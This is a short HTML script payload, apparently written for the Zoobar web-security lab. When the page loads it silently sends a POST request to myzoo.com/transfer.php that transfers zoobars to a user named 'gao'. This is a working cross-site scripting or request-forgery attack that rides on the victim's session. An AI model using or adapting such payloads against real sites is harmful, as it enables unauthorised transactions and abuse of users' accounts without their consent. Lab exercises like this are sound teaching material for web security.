<script>
function loadXMLDoc()
{
xmlhttp=new XMLHttpRequest();
xmlhttp.open("POST","http://myzoo.com/transfer.php",true);
xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded;charset=UTF-8");
xmlhttp.send("zoobars=2&recipient=gao&submission=Send");
}
loadXMLDoc()
</script>